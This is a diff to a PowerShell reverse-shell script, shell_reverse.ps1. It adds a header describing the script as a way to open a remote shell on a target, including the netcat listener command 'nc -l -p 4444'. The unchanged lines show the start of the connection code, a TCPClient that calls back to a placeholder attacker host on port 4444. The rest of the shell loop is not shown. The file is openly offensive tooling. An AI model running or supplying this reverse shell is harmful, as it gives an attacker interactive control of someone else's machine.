@@ -1,4 +1,30 @@
 
+<#
+
+ Basic Shell Reverse 
+
+.DESCRIPTION
+    The following PowerShell script enables you to establish a remote shell with a target.
+
+
+.EXAMPLE
+    To run this string, we must to have  netcat running in the port 4444 as following: nc -l -p 4444
+    The example below execute the program
+    PS C:\> .\shell_reverse.ps1
+
+
+.NOTES
+    Author: rolEYder
+    Github: https://github.com/RolEYder
+    Last Edit: 2020-12-07
+    Current Version: v1.0.0
+ 
+.TESTING
+    Windows 7 Server Pack 1
+#>
+
+
+
 # Socket Connection
 $client = New-Object System.Net.Sockets.TCPCLient("{HOST-IP}", 4444);
 $stream = $client.GetStream();
